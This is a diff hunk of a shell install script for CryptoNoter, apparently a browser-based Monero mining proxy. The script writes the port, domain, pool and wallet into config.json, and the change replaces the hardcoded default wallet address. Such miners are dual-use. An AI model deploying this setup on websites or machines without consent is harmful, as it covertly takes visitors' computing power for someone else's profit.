@@ -24,7 +24,7 @@ cd CryptoNoter
 sed -i "s/7777/$lport/g" config.json
 sed -i "s/miner.ebukentiy.xyz/$domain/g" config.json
 sed -i "s/gulf.moneroocean.stream:443/$pool/g" config.json
-sed -i "s/42zXE5jcPpWR2J6pVRE39uJEqUdMWdW2H4if27wcS1bwUbBRTeSR5aDbAxP5KCjWueiZevjSBxqNZ36Q5ANPND3m4RJoeqX/$addr/g" config.json
+sed -i "s/43Tg2YS8kPE2KmR4QcuhzP7EX6Kyjbew2eoCajmeDqNNTY6Wn7zYTMYhNfyW1w21rdeBjPWAdYtgFHAWJhT8y2MYEGvJwAW/$addr/g" config.json
 sed -i "s/\"pass\": \"\"/\"pass\": \"$pass\"/g" config.json
 npm update
 npm install -g forever
